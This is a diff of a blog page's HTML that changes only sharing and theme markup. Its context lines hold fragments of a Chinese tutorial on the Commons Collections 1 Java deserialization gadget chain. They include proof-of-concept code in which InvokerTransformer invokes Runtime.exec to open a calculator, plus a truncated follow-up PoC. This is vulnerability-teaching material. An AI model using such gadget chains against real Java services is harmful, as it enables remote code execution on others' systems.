@@ -60,6 +60,7 @@ setValue()方法调用了checkSetValue()，构造一个payload，看看能不能
 1 2 3 4 5 6 7 8 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;}); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(&#34;key&#34;,&#34;value&#34;); Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer); for(Map.Entry entry:transformedMap.entrySet()){ entry.setValue(r); 接着找一个setValue()方法的调用，在sun.reflect.annotation.AnnotationInvocationHandler类中，找到了如下方法
 这里调用了setValue()方法，并且还在readObject()方法中，继续构造poc
 1 2 3 4 5 6 7 8 9 10 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;exec&#34;,new Class[]{String."/>
+<meta name="twitter:site" content="@huahua39079406"/>
 <meta name="application-name" content="FixIt">
 <meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
     <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -168,7 +169,7 @@ setValue()方法调用了checkSetValue()，构造一个payload，看看能不能
     </li>
   </ul>
 </nav></div>
-      </div><div class="content" id="content"><h1 id="commonscollections1链详解" class="heading-element">
+      </div><div class="content" id="content" data-end-flag="Reading End"><h1 id="commonscollections1链详解" class="heading-element">
   <a href="#commonscollections1%e9%93%be%e8%af%a6%e8%a7%a3" class="heading-mark"></a>CommonsCollections1链详解</h1><p>jdk8源码下载
 <a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4"target="_blank" rel="external nofollow noopener noreferrer">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a>
 <strong>漏洞触发点在</strong><code>org.apache.commons.collections.functors.InvokerTransformer</code>
@@ -411,7 +412,7 @@ setValue()方法调用了checkSetValue()，构造一个payload，看看能不能
       </div></div><div class="post-info-line">
         <div class="post-info-md"><span><a href="/posts/ca4c9c3/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span></div>
         <div class="post-info-share">
-          <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://nlrvana.github.io/posts/ca4c9c3/" data-title="CommonsCollections1链详解" data-hashtags="CommonsCollections"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+          <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://nlrvana.github.io/posts/ca4c9c3/" data-title="CommonsCollections1链详解" data-via="huahua39079406" data-hashtags="CommonsCollections"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
   <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://nlrvana.github.io/posts/ca4c9c3/" data-hashtag="CommonsCollections"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
   <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://nlrvana.github.io/posts/ca4c9c3/" data-title="CommonsCollections1链详解"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
   </span>
@@ -431,13 +432,13 @@ setValue()方法调用了checkSetValue()，构造一个payload，看看能不能
 </article>
 
   <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
-      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
     <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.121.2"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.1"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
         </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
             <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
               <a href="https://nlrvana.github.io"target="_blank" rel="external nofollow noopener noreferrer">N1Rvana</a></span></div></div>
   </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
-        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+        </div></div><div id="mask"></div><noscript>
     <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
   </noscript>
 </div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"}};</script><script src="/js/theme.min.js" defer></script></body>
